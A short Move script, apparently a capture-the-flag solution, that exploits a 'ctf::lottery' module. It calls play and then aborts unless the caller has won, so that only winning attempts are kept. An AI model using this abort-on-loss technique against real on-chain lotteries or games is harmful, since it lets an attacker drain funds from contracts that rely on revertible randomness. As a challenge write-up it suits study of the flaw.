script {
    use std::error::not_implemented;
    use std::signer::address_of;
    use ctf::lottery::{play, has_won};

    const E_lose :u64 =1;

    fun attack(caller:&signer){
        

        play(caller);

        assert!(has_won(address_of(caller)),not_implemented(E_lose));

    }


}